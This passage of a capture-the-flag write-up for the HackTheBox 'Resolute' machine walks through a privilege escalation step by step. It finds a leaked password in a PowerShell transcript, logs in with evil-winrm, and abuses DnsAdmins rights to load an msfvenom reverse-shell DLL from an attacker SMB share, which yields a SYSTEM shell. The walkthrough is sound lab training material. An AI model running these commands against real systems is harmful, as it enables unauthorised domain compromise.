+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line">*Evil<span class="literal">-WinRM</span>* PS C:\PSTranscripts\<span class="number">20191203</span>&gt; type PowerShell_transcript.RESOLUTE.OJuoBGhU.<span class="number">20191203063201</span>.txt</span><br><span class="line"></span><br><span class="line">**********************</span><br><span class="line">Windows PowerShell transcript start</span><br><span class="line">Start time: <span class="number">20191203063201</span></span><br><span class="line">Username: MEGABANK\ryan</span><br><span class="line">RunAs User: MEGABANK\ryan</span><br><span class="line">Machine: RESOLUTE (Microsoft Windows NT <span class="number">10.0</span>.<span class="number">14393.0</span>)</span><br><span class="line">Host Application: C:\Windows\system32\wsmprovhost.exe <span class="literal">-Embedding</span></span><br><span class="line"><span class="keyword">Process</span> ID: <span class="number">2800</span></span><br><span class="line">PSVersion: <span class="number">5.1</span>.<span class="number">14393.2273</span></span><br><span class="line">PSEdition: Desktop</span><br><span class="line">PSCompatibleVersions: <span class="number">1.0</span>, <span class="number">2.0</span>, <span class="number">3.0</span>, <span class="number">4.0</span>, <span class="number">5.0</span>, <span class="number">5.1</span>.<span class="number">14393.2273</span></span><br><span class="line">BuildVersion: <span class="number">10.0</span>.<span class="number">14393.2273</span></span><br><span class="line">CLRVersion: <span class="number">4.0</span>.<span class="number">30319.42000</span></span><br><span class="line">WSManStackVersion: <span class="number">3.0</span></span><br><span class="line">PSRemotingProtocolVersion: <span class="number">2.3</span></span><br><span class="line">SerializationVersion: <span class="number">1.1</span>.<span class="number">0.1</span></span><br><span class="line">**********************</span><br><span class="line">Command start time: <span class="number">20191203063455</span></span><br><span class="line">**********************</span><br><span class="line">PS&gt;TerminatingError(): <span class="string">"System error."</span></span><br><span class="line">&gt;&gt; CommandInvocation(<span class="built_in">Invoke-Expression</span>): <span class="string">"Invoke-Expression"</span></span><br><span class="line">&gt;&gt; ParameterBinding(<span class="built_in">Invoke-Expression</span>): name=<span class="string">"Command"</span>; value=<span class="string">"-join(<span class="variable">$id</span>,'PS ',<span class="variable">$</span>(whoami),'@',<span class="variable">$env:computername</span>,' ',<span class="variable">$</span>((gi <span class="variable">$pwd</span>).Name),'&gt; ')</span></span><br><span class="line"><span class="string">if (!<span class="variable">$</span>?) &#123; if(<span class="variable">$LASTEXITCODE</span>) &#123; exit <span class="variable">$LASTEXITCODE</span> &#125; else &#123; exit 1 &#125; &#125;"</span></span><br><span class="line">&gt;&gt; CommandInvocation(<span class="built_in">Out-String</span>): <span class="string">"Out-String"</span></span><br><span class="line">&gt;&gt; ParameterBinding(<span class="built_in">Out-String</span>): name=<span class="string">"Stream"</span>; value=<span class="string">"True"</span></span><br><span class="line">**********************</span><br><span class="line">Command start time: <span class="number">20191203063455</span></span><br><span class="line">**********************</span><br><span class="line">PS&gt;ParameterBinding(<span class="built_in">Out-String</span>): name=<span class="string">"InputObject"</span>; value=<span class="string">"PS megabank\ryan@RESOLUTE Documents&gt; "</span></span><br><span class="line">PS megabank\ryan@RESOLUTE Documents&gt;</span><br><span class="line">**********************</span><br><span class="line">Command start time: <span class="number">20191203063515</span></span><br><span class="line">**********************</span><br><span class="line">PS&gt;CommandInvocation(<span class="built_in">Invoke-Expression</span>): <span class="string">"Invoke-Expression"</span></span><br><span class="line">&gt;&gt; ParameterBinding(<span class="built_in">Invoke-Expression</span>): name=<span class="string">"Command"</span>; value=<span class="string">"cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">if (!<span class="variable">$</span>?) &#123; if(<span class="variable">$LASTEXITCODE</span>) &#123; exit <span class="variable">$LASTEXITCODE</span> &#125; else &#123; exit 1 &#125; &#125;"</span></span><br><span class="line">&gt;&gt; CommandInvocation(<span class="built_in">Out-String</span>): <span class="string">"Out-String"</span></span><br><span class="line">&gt;&gt; ParameterBinding(<span class="built_in">Out-String</span>): name=<span class="string">"Stream"</span>; value=<span class="string">"True"</span></span><br><span class="line">**********************</span><br><span class="line">Windows PowerShell transcript start</span><br><span class="line">Start time: <span class="number">20191203063515</span></span><br><span class="line">Username: MEGABANK\ryan</span><br><span class="line">RunAs User: MEGABANK\ryan</span><br><span class="line">Machine: RESOLUTE (Microsoft Windows NT <span class="number">10.0</span>.<span class="number">14393.0</span>)</span><br><span class="line">Host Application: C:\Windows\system32\wsmprovhost.exe <span class="literal">-Embedding</span></span><br><span class="line"><span class="keyword">Process</span> ID: <span class="number">2800</span></span><br><span class="line">PSVersion: <span class="number">5.1</span>.<span class="number">14393.2273</span></span><br><span class="line">PSEdition: Desktop</span><br><span class="line">PSCompatibleVersions: <span class="number">1.0</span>, <span class="number">2.0</span>, <span class="number">3.0</span>, <span class="number">4.0</span>, <span class="number">5.0</span>, <span class="number">5.1</span>.<span class="number">14393.2273</span></span><br><span class="line">BuildVersion: <span class="number">10.0</span>.<span class="number">14393.2273</span></span><br><span class="line">CLRVersion: <span class="number">4.0</span>.<span class="number">30319.42000</span></span><br><span class="line">WSManStackVersion: <span class="number">3.0</span></span><br><span class="line">PSRemotingProtocolVersion: <span class="number">2.3</span></span><br><span class="line">SerializationVersion: <span class="number">1.1</span>.<span class="number">0.1</span></span><br><span class="line">**********************</span><br><span class="line">**********************</span><br><span class="line">Command start time: <span class="number">20191203063515</span></span><br><span class="line">**********************</span><br><span class="line">PS&gt;CommandInvocation(<span class="built_in">Out-String</span>): <span class="string">"Out-String"</span></span><br><span class="line">&gt;&gt; ParameterBinding(<span class="built_in">Out-String</span>): name=<span class="string">"InputObject"</span>; value=<span class="string">"The syntax of this command is:"</span></span><br><span class="line">cmd : The syntax of this command is:</span><br><span class="line">At line:<span class="number">1</span> char:<span class="number">1</span></span><br><span class="line">+ cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!</span><br><span class="line">+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span><br><span class="line">    + CategoryInfo          : NotSpecified: (The syntax of this command is::String) [], RemoteException</span><br><span class="line">    + FullyQualifiedErrorId : NativeCommandError</span><br><span class="line">cmd : The syntax of this command is:</span><br><span class="line">At line:<span class="number">1</span> char:<span class="number">1</span></span><br><span class="line">+ cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!</span><br><span class="line">+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span><br><span class="line">    + CategoryInfo          : NotSpecified: (The syntax of this command is::String) [], RemoteException</span><br><span class="line">    + FullyQualifiedErrorId : NativeCommandError</span><br><span class="line">**********************</span><br><span class="line">Windows PowerShell transcript start</span><br><span class="line">Start time: <span class="number">20191203063515</span></span><br><span class="line">Username: MEGABANK\ryan</span><br><span class="line">RunAs User: MEGABANK\ryan</span><br><span class="line">Machine: RESOLUTE (Microsoft Windows NT <span class="number">10.0</span>.<span class="number">14393.0</span>)</span><br><span class="line">Host Application: C:\Windows\system32\wsmprovhost.exe <span class="literal">-Embedding</span></span><br><span class="line"><span class="keyword">Process</span> ID: <span class="number">2800</span></span><br><span class="line">PSVersion: <span class="number">5.1</span>.<span class="number">14393.2273</span></span><br><span class="line">PSEdition: Desktop</span><br><span class="line">PSCompatibleVersions: <span class="number">1.0</span>, <span class="number">2.0</span>, <span class="number">3.0</span>, <span class="number">4.0</span>, <span class="number">5.0</span>, <span class="number">5.1</span>.<span class="number">14393.2273</span></span><br><span class="line">BuildVersion: <span class="number">10.0</span>.<span class="number">14393.2273</span></span><br><span class="line">CLRVersion: <span class="number">4.0</span>.<span class="number">30319.42000</span></span><br><span class="line">WSManStackVersion: <span class="number">3.0</span></span><br><span class="line">PSRemotingProtocolVersion: <span class="number">2.3</span></span><br><span class="line">SerializationVersion: <span class="number">1.1</span>.<span class="number">0.1</span></span><br><span class="line">**********************</span><br></pre></td></tr></table></figure>
+
+<p>Looks like we have <code>Ryan</code> clear text password in there:</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!</span><br></pre></td></tr></table></figure>
+
+<p>Let’s see if the credentials are valid:</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[<span class="type">hg8</span>@<span class="type">archbook</span> ~]<span class="variable">$</span> evil<span class="literal">-winrm</span> <span class="literal">-i</span> <span class="number">10.10</span>.<span class="number">10.169</span> <span class="literal">-u</span> ryan <span class="literal">-p</span> <span class="string">"Serv3r4Admin4cc123\!"</span></span><br><span class="line"></span><br><span class="line">Evil<span class="literal">-WinRM</span> shell v2.<span class="number">3</span></span><br><span class="line"></span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line"></span><br><span class="line">*Evil<span class="literal">-WinRM</span>* PS C:\Users\ryan\Documents&gt;</span><br></pre></td></tr></table></figure>
+
+<p>Bingo! </p>
+<h3 id="DNS-Admin-Privilege-escalation"><a href="#DNS-Admin-Privilege-escalation" class="headerlink" title="DNS Admin Privilege escalation"></a>DNS Admin Privilege escalation</h3><p><code>Ryan</code> account password seems to mean he is the server admin (<code>Serv3r4Admin4cc123!</code>). Let’s see if it’s really the case:</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">*Evil<span class="literal">-WinRM</span>* PS C:\&gt; whoami /groups</span><br><span class="line"></span><br><span class="line">GROUP INFORMATION</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">Group Name                                 Type             SID                                            Attributes</span><br><span class="line">========================================== ================ ============================================== ===============================================================</span><br><span class="line">Everyone                                   Well<span class="literal">-known</span> group S<span class="literal">-1</span><span class="literal">-1</span><span class="literal">-0</span>                                        Mandatory group, Enabled by default, Enabled group</span><br><span class="line">BUILTIN\Users                              Alias            S<span class="literal">-1</span><span class="literal">-5</span><span class="literal">-32</span><span class="literal">-545</span>                                   Mandatory group, Enabled by default, Enabled group</span><br><span class="line">BUILTIN\Pre<span class="literal">-Windows</span> <span class="number">2000</span> Compatible Access Alias            S<span class="literal">-1</span><span class="literal">-5</span><span class="literal">-32</span><span class="literal">-554</span>                                   Mandatory group, Enabled by default, Enabled group</span><br><span class="line">BUILTIN\Remote Management Users            Alias            S<span class="literal">-1</span><span class="literal">-5</span><span class="literal">-32</span><span class="literal">-580</span>                                   Mandatory group, Enabled by default, Enabled group</span><br><span class="line">NT AUTHORITY\NETWORK                       Well<span class="literal">-known</span> group S<span class="literal">-1</span><span class="literal">-5</span><span class="literal">-2</span>                                        Mandatory group, Enabled by default, Enabled group</span><br><span class="line">NT AUTHORITY\Authenticated Users           Well<span class="literal">-known</span> group S<span class="literal">-1</span><span class="literal">-5</span><span class="literal">-11</span>                                       Mandatory group, Enabled by default, Enabled group</span><br><span class="line">NT AUTHORITY\This Organization             Well<span class="literal">-known</span> group S<span class="literal">-1</span><span class="literal">-5</span><span class="literal">-15</span>                                       Mandatory group, Enabled by default, Enabled group</span><br><span class="line">MEGABANK\Contractors                       Group            S<span class="literal">-1</span><span class="literal">-5</span><span class="literal">-21</span><span class="literal">-1392959593</span><span class="literal">-3013219662</span><span class="literal">-3596683436</span><span class="literal">-1103</span> Mandatory group, Enabled by default, Enabled group</span><br><span class="line">MEGABANK\DnsAdmins                         Alias            S<span class="literal">-1</span><span class="literal">-5</span><span class="literal">-21</span><span class="literal">-1392959593</span><span class="literal">-3013219662</span><span class="literal">-3596683436</span><span class="literal">-1101</span> Mandatory group, Enabled by default, Enabled group, Local Group</span><br><span class="line">NT AUTHORITY\NTLM Authentication           Well<span class="literal">-known</span> group S<span class="literal">-1</span><span class="literal">-5</span><span class="literal">-64</span><span class="literal">-10</span>                                    Mandatory group, Enabled by default, Enabled group</span><br><span class="line">Mandatory Label\Medium Mandatory Level     Label            S<span class="literal">-1</span><span class="literal">-16</span><span class="literal">-8192</span></span><br></pre></td></tr></table></figure>
+
+<p><code>Ryan</code> belongs to <code>DnsAdmins</code> group. Since DNS service is known to run as <code>SYSTEM</code> maybe we can abuse our DNS admin rights to escalate our privileges.</p>
+<p>Searching this topic online we found this article:</p>
+<blockquote>
+<p> <strong>Abusing DNSAdmins privilege for escalation in Active Directory</strong> </p>
+<p> This post details a feature abuse in AD where a user who is member of the DNSAdmins group or have write privileges to a DNS server object can load an arbitrary DLL with SYSTEM privileges on the DNS server. </p>
+<p><a href="http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html" target="_blank" rel="noopener">http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html</a></p>
+</blockquote>
+<p>The article mention that this attack will corrupts dns.exe service. It shouldn’t be a issue for other people working on the box since we found this note on <code>Ryan</code> desktop:</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">*Evil<span class="literal">-WinRM</span>* PS C:\Users\ryan\Desktop&gt; type note.txt</span><br><span class="line">Email to team:</span><br><span class="line"></span><br><span class="line">- due to change freeze, any system changes (apart from those to the administrator account) will be automatically reverted within <span class="number">1</span> minute</span><br></pre></td></tr></table></figure>
+
+<p>Alright sounds like what we have all we need. Let’s give it a try.</p>
+<p>First let’s create our malicious DLL, this one will open a reverse shell:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$  msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=8585 -f dll &gt; hg8.dll</span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br><span class="line">[-] No arch selected, selecting arch: x64 from the payload</span><br><span class="line">No encoder or badchars specified, outputting raw payload</span><br><span class="line">Payload size: 460 bytes</span><br><span class="line">Final size of dll file: 5120 bytes</span><br></pre></td></tr></table></figure>
+
+<p>Then we host this DLL on a Samba server we control:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ wget https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/smbserver.py</span><br><span class="line">[hg8@archbook ~]$ cp hg8.dll ~/share/</span><br><span class="line">[hg8@archbook ~]$ sudo python smbserver.py -smb2support hg8 /home/hg8/share/</span><br><span class="line">Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[*] Config file parsed</span><br><span class="line">[*] Callback added <span class="keyword">for</span> UUID 4B324FC8-1670-01D3-9999-5A47BF6EE188 V:3.0</span><br><span class="line">[*] Callback added <span class="keyword">for</span> UUID 6BFFD098-A112-3610-8888-46C3F87E345A V:1.0</span><br><span class="line">[*] Config file parsed</span><br><span class="line">[*] Config file parsed</span><br><span class="line">[*] Config file parsed</span><br></pre></td></tr></table></figure>
+
+<p>Now we open our <code>nc</code> listener:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8585</span><br><span class="line">Listening on any address 8585</span><br></pre></td></tr></table></figure>
+
+<p>Finally we should be able to inject our DLL:</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">*Evil<span class="literal">-WinRM</span>* PS C:\&gt; dnscmd  /config /serverlevelplugindll \\<span class="number">10.10</span>.<span class="number">10.10</span>\hg8\hg8.dll</span><br><span class="line"></span><br><span class="line">Registry property serverlevelplugindll successfully reset.</span><br><span class="line">Command completed successfully.</span><br></pre></td></tr></table></figure>
+
+<p>Then we restart the DNS service:</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">*Evil<span class="literal">-WinRM</span>* PS C:\&gt; sc.exe stop dns</span><br><span class="line">SERVICE_NAME: dns</span><br><span class="line">        TYPE               : <span class="number">10</span>  WIN32_OWN_PROCESS</span><br><span class="line">        STATE              : <span class="number">3</span>  STOP_PENDING</span><br><span class="line">                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)</span><br><span class="line">        WIN32_EXIT_CODE    : <span class="number">0</span>  (<span class="number">0</span>x0)</span><br><span class="line">        SERVICE_EXIT_CODE  : <span class="number">0</span>  (<span class="number">0</span>x0)</span><br><span class="line">        CHECKPOINT         : <span class="number">0</span>x1</span><br><span class="line">        WAIT_HINT          : <span class="number">0</span>x7530</span><br><span class="line">*Evil<span class="literal">-WinRM</span>* PS C:\&gt; sc.exe start dns</span><br><span class="line">SERVICE_NAME: dns</span><br><span class="line">        TYPE               : <span class="number">10</span>  WIN32_OWN_PROCESS</span><br><span class="line">        STATE              : <span class="number">2</span>  START_PENDING</span><br><span class="line">                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)</span><br><span class="line">        WIN32_EXIT_CODE    : <span class="number">0</span>  (<span class="number">0</span>x0)</span><br><span class="line">        SERVICE_EXIT_CODE  : <span class="number">0</span>  (<span class="number">0</span>x0)</span><br><span class="line">        CHECKPOINT         : <span class="number">0</span>x0</span><br><span class="line">        WAIT_HINT          : <span class="number">0</span>x7d0</span><br><span class="line">        PID                : <span class="number">648</span></span><br><span class="line">        FLAGS              :</span><br></pre></td></tr></table></figure>
+
+<p>We can see our DLL being injected:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ sudo python smbserver.py -smb2support hg8 /home/hg8/share/</span><br><span class="line">Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[*] Config file parsed</span><br><span class="line">[*] Callback added <span class="keyword">for</span> UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0</span><br><span class="line">[*] Callback added <span class="keyword">for</span> UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0</span><br><span class="line">[*] Config file parsed</span><br><span class="line">[*] Config file parsed</span><br><span class="line">[*] Config file parsed</span><br><span class="line">[*] Incoming connection (10.10.10.169,50246)</span><br><span class="line">[*] AUTHENTICATE_MESSAGE (MEGABANK\RESOLUTE$,RESOLUTE)</span><br><span class="line">[*] User RESOLUTE\RESOLUTE$ authenticated successfully</span><br><span class="line">[*] RESOLUTE$::MEGABANK:4141414141414141:9bbc3576f3dfc56f64db8c2e72c24699:010100000000000000cb8cfb1235d601e6de8a857f2b6d9f0000000001001000580058006f006300480064004200710003001000580058006f006300480064004200710002001000420055004a00700041004f004400690004001000420055004a00700041004f00440069000700080000cb8cfb1235d60106000400020000000800300030000000000000000000000000400000ca3799be54bd584fc02a5a66719df22dd96fdf85822b6023559be0d172ac9b5b0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00310038000000000000000000</span><br><span class="line">[*] Connecting Share(1:IPC$)</span><br><span class="line">[*] Connecting Share(2:hg8)</span><br></pre></td></tr></table></figure>
+
+<p>And after a little wait a new connection appear on our reverse shell:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8585</span><br><span class="line">Listening on any address 8585</span><br><span class="line">Connection from 10.10.10.169:50247</span><br><span class="line">Microsoft Windows [Version 10.0.14393]</span><br><span class="line">(c) 2016 Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;whoami</span><br><span class="line">nt authority\system</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;<span class="built_in">type</span> C:\Users\Administrator\Desktop\root.txt</span><br><span class="line">exxxxxxxxxxxxxxxxxxxc</span><br></pre></td></tr></table></figure>
+
+
+
+<hr>
+<p>That’s it folks! As always do not hesitate to contact me for any questions or feedbacks!</p>
+<p>See you next time ;)</p>
+<p>-hg8</p>
+
+  </div>
+</article>
+<br>
+<br>
+
+
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/CTF/">CTF</a> › <a class="category-link" href="/categories/CTF/HackTheBox/">HackTheBox</a> › <a class="category-link" href="/categories/CTF/HackTheBox/Medium-Box/">Medium Box</a>
+    </div>
+
+
+
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/RPC/" rel="tag">RPC</a>, <a class="tag-link" href="/tags/SMB/" rel="tag">SMB</a>, <a class="tag-link" href="/tags/crackmapexec/" rel="tag">crackmapexec</a>, <a class="tag-link" href="/tags/dll/" rel="tag">dll</a>, <a class="tag-link" href="/tags/dll-injection/" rel="tag">dll injection</a>, <a class="tag-link" href="/tags/dns/" rel="tag">dns</a>, <a class="tag-link" href="/tags/dnsadmin/" rel="tag">dnsadmin</a>, <a class="tag-link" href="/tags/enum4linux/" rel="tag">enum4linux</a>, <a class="tag-link" href="/tags/evil-winrm/" rel="tag">evil-winrm</a>, <a class="tag-link" href="/tags/ldap/" rel="tag">ldap</a>, <a class="tag-link" href="/tags/ldapdomaindump/" rel="tag">ldapdomaindump</a>, <a class="tag-link" href="/tags/msfvenom/" rel="tag">msfvenom</a>, <a class="tag-link" href="/tags/resolute/" rel="tag">resolute</a>, <a class="tag-link" href="/tags/windows/" rel="tag">windows</a>, <a class="tag-link" href="/tags/winrm/" rel="tag">winrm</a>
+    </div>
+
+
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Posts</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#User-Flag"><span class="toc-number">1.</span> <span class="toc-text">User Flag</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Recon"><span class="toc-number">1.1.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Brute-force-using-default-password"><span class="toc-number">1.2.</span> <span class="toc-text">Brute-force using default password</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LDAP-Dump"><span class="toc-number">1.3.</span> <span class="toc-text">LDAP Dump</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Shell-as-Melanie"><span class="toc-number">1.4.</span> <span class="toc-text">Shell as Melanie</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Root-FLag"><span class="toc-number">2.</span> <span class="toc-text">Root FLag</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Recon-1"><span class="toc-number">2.1.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pivot-melanie-gt-ryan"><span class="toc-number">2.2.</span> <span class="toc-text">Pivot melanie -&gt; ryan</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DNS-Admin-Privilege-escalation"><span class="toc-number">2.3.</span> <span class="toc-text">DNS Admin Privilege escalation</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2020
+    <a href="https://hg8.sh">hg8.sh</a>
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Archives</a></li>
+         
+          <li><a href="/categories/">Category</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+         
+          <li><a href="/atom.xml">RSS</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+    
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/js/main.js"></script>
+
+
+
+
+</body>
+</html>
